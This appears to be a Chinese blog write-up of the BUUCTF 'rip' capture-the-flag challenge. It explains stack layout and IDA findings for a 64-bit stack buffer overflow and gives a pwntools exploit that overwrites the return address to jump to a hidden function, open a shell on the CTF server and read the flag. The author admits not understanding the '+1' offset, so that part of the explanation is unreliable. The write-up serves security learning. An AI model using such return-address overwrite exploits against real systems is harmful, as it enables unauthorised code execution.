# BUUCTF-rip

[https://www.cnblogs.com/refrain-again/p/15001283.html](https://www.cnblogs.com/refrain-again/p/15001283.html) 

看了这个文章 我起码能理解我们栈溢出的目的

在做题之前 我们需要先理解

栈的存储方法





<img src="https://i-blog.csdnimg.cn/blog_migrate/2b1ae757b1b04de2916c8f17d25cd7ee.png" alt="" style="max-height:707px; box-sizing:content-box;" />


<img src="https://i-blog.csdnimg.cn/blog_migrate/fe851a9b798dbb2a63953ed739ba9877.png" alt="" style="max-height:649px; box-sizing:content-box;" />


从上往下看 就能理解入栈

说回这道题目

为什么这道题目是栈溢出

## 1.查看基本信息

checksec



<img src="https://i-blog.csdnimg.cn/blog_migrate/93cdc3e46c92cf501fc35f82d05101f1.png" alt="" style="max-height:229px; box-sizing:content-box;" />


file



<img src="https://i-blog.csdnimg.cn/blog_migrate/45392765f46a8a7495315484926fb56d.png" alt="" style="max-height:229px; box-sizing:content-box;" />




```kotlin
是kali下的elf文件 相当于windows 的exe
可执行文件
 
有main（）和fun()
```

我们把他放入ida

## 2.ida

主函数的代码



<img src="https://i-blog.csdnimg.cn/blog_migrate/00206a8421e44c0fad2ef7c58de9d2af.png" alt="" style="max-height:163px; box-sizing:content-box;" />


但是我们发现还有一个fun()函数



<img src="https://i-blog.csdnimg.cn/blog_migrate/34669ec67afb0011c8b99eab881ddec1.png" alt="" style="max-height:148px; box-sizing:content-box;" />


找到我们的进门钥匙

我们发现我们是输入 东西 并且作为 s

s 的类型是 char    占15个字节

我们看看我们需要多少才能达到被调用函数的返回地址

就是我们需要多少字节才能 让被调用函数返回



<img src="https://i-blog.csdnimg.cn/blog_migrate/dee716c1583e685743d7c1c94d171e96.png" alt="" style="max-height:63px; box-sizing:content-box;" />


在ida中很明显告诉我们栈底和栈顶是多少了

```cobol
因为是64 
 
rdp是栈底 就是高地址   函数结束地址
 
 
rsp是栈顶 就是低地址   函数开始地址 压入栈地址
```

FH = 15字节



<img src="https://i-blog.csdnimg.cn/blog_migrate/4c109a7ffa3376daabfbf96e5f4b5905.png" alt="" style="max-height:533px; box-sizing:content-box;" />


从图里能看见 局部变量的压入 就是我们输入的s 占 15字节

但是前面还有一个被调用函数的基地址 就是rbp 我们也要给他构造

但是这个多大呢

```cobol
因为这道题目是 64 所以 rbp是 8个字节
如果是 32 就是ebp 占 4个字节
```

```kotlin
所以我们只需要构造15字节的东西填充s 构造8个字节的东西填充基地址 并且把函数返回地址改为fun函数地址即可
```

我们也要明白fun函数开始的地址是什么



<img src="https://i-blog.csdnimg.cn/blog_migrate/66e841371c7a811b9c8dc7b73017d1a0.png" alt="" style="max-height:268px; box-sizing:content-box;" />


得到函数开始地址

```cobol
0x401186
```

这样就能返回到fun函数开始地址

执行fun函数

所以我们开始写exp

```cobol
from pwn import *
p=remote('node4.buuoj.cn',27408)
payload=b'A'*15+b'B'*8+p64(0x401186+1) 
p.sendline(payload)
p.interactive()
```

输入二进制15个A和8个B 打包小端序的地址

其中+1是为了栈平衡 （不明白）

如果脚本结尾忘了加p.interactive(),并且交互完程序并未停止的话，程序会直接被杀掉……然后你就会看到调试时总是莫名其妙的sigkill……

```scss
p64()发送数据时，是发送的字节流，也就是比特流（二进制流）
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/f0e5deea39adb153bd95b293610652ed.png" alt="" style="max-height:380px; box-sizing:content-box;" />


成功



<img src="https://i-blog.csdnimg.cn/blog_migrate/2841b027f24eb2716eaa97c337b0ba0d.png" alt="" style="max-height:318px; box-sizing:content-box;" />


cat flag



<img src="https://i-blog.csdnimg.cn/blog_migrate/62ae57c8cb1c337ab81a52d37fa8ba2d.png" alt="" style="max-height:84px; box-sizing:content-box;" />